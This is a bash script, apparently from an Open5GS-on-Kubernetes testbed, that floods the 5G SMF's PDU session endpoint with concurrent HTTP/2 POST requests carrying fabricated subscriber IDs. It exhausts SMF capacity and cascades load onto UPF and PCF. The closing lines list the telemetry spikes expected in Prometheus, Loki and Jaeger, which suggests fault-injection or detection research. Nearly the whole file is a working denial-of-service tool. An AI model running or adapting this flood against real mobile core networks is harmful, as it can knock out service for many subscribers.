#!/usr/bin/env bash
# inject_sbi_flood_smf.sh
# ───────────────────────
# Injects an HTTP/2 SBI flood on the SMF by hammering its PDU session
# management endpoint with concurrent POST requests from inside the cluster.
#
# Each request forces SMF to:
#   1. Parse + validate the PDU session request
#   2. Initiate PFCP session establishment with UPF (N4 interface)
#   3. Query PCF for session management policy (/npcf-smpolicycontrol)
#   4. Respond with error (no matching subscriber) but absorbs full processing cost
#
# This exhausts SMF's session capacity and cascades load onto UPF (PFCP) and
# PCF (policy lookup) simultaneously — a three-NF cascade from a single attack point.
# Based on: 3GPP TR 33.926 §6.3 (SMF availability threats)
#
# Usage: ./inject_sbi_flood_smf.sh [concurrency] [duration_seconds]
# Default: 20 concurrent workers, 300 seconds

set -euo pipefail

CONCURRENCY=${1:-20}
DURATION=${2:-300}

# Dynamically resolve SMF ClusterIP — robust across cluster recreates
SMF_IP=$(kubectl get svc -n open5gs open5gs-smf-sbi \
    -o jsonpath='{.spec.clusterIP}' 2>/dev/null || echo "")

if [[ -z "$SMF_IP" ]]; then
    echo "ERROR: Could not resolve SMF ClusterIP. Is the cluster running?"
    echo "  kubectl get svc -n open5gs open5gs-smf"
    exit 1
fi

SMF_SBI="http://${SMF_IP}:7777"
# PDU session creation endpoint (3GPP TS 29.502)
ENDPOINT="${SMF_SBI}/nsmf-pdusession/v1/sm-contexts"

echo "[smf-flood] Target:      ${ENDPOINT}"
echo "[smf-flood] Concurrency: ${CONCURRENCY} workers"
echo "[smf-flood] Duration:    ${DURATION}s"
echo "[smf-flood] Protocol:    HTTP/2 cleartext (h2c)"
echo "[smf-flood] Effect:      SMF session exhaustion + UPF PFCP + PCF policy cascade"
echo ""

# Find a pod inside the cluster to run from
UE_NS=$(kubectl get pods --all-namespaces | grep -i "ueransim-ues" | grep -v "Terminating" | head -1 | awk '{print $1}')
UE_POD=$(kubectl get pods --all-namespaces | grep -i "ueransim-ues" | grep -v "Terminating" | head -1 | awk '{print $2}')

if [[ -z "$UE_POD" ]]; then
    echo "ERROR: Could not find ueransim-ues pod"
    exit 1
fi
echo "[smf-flood] Running flood from pod: $UE_POD ($UE_NS)"

# Minimal 3GPP TS 29.502 SmContextCreateData body
# Uses MCC=999, MNC=70 matching Open5GS test subscriber DB
# Varying supi per request creates distinct session attempts
SM_CONTEXT_BODY='{
  "supi": "imsi-999700000000IMSI",
  "pei": "imei-356938035643809",
  "gpsi": "msisdn-0900000000",
  "pdusessionid": 1,
  "dnn": "internet",
  "sNssai": {"sst": 1, "sd": "010203"},
  "servingNfId": "00000000-0000-0000-0000-000000000001",
  "guami": {
    "plmnId": {"mcc": "999", "mnc": "70"},
    "amfId": "cafe00"
  },
  "anType": "3GPP_ACCESS",
  "ratType": "NR",
  "n1SmMsg": {"content": ""},
  "requestType": "INITIAL_REQUEST"
}'

FLOOD_SCRIPT=$(cat <<'INNER'
#!/bin/sh
ENDPOINT="$1"
CONCURRENCY="$2"
DURATION="$3"
BODY_TEMPLATE="$4"

END_TIME=$(( $(date +%s) + DURATION ))
WAVE=0

while [ $(date +%s) -lt $END_TIME ]; do
    REMAINING=$(( END_TIME - $(date +%s) ))
    WAVE=$(( WAVE + 1 ))
    echo "[wave $WAVE] ${REMAINING}s remaining — launching $CONCURRENCY session requests..."

    i=0
    while [ $i -lt $CONCURRENCY ]; do
        FAKE_IMSI=$(printf '%012d' $((WAVE * 100 + i)))
        BODY=$(echo "$BODY_TEMPLATE" | sed "s/IMSI/$FAKE_IMSI/g")
        curl -s --max-time 3 --http2-prior-knowledge \
            -X POST "$ENDPOINT" \
            -H "Content-Type: application/json" \
            -d "$BODY" \
            -o /dev/null 2>/dev/null &
        i=$(( i + 1 ))
    done
    wait
    sleep 1
done

echo "[smf-flood] Done — ran $WAVE waves over ${DURATION}s"
INNER
)

kubectl exec -n "$UE_NS" "$UE_POD" -- sh -c "$FLOOD_SCRIPT" -- \
    "$ENDPOINT" "$CONCURRENCY" "$DURATION" "$SM_CONTEXT_BODY"

echo ""
echo "[smf-flood] Flood complete. Expected telemetry:"
echo "  - Prometheus: SMF cpu_rate + net_rx_rate spike"
echo "  - Prometheus: UPF pfcp_sessions_active churn; PCF cpu_rate secondary spike"
echo "  - Loki: flood of SMF PDU session rejection logs + PCF policy lookup logs"
echo "  - Jaeger: SMF→UPF (PFCP) and SMF→PCF spans explosion"
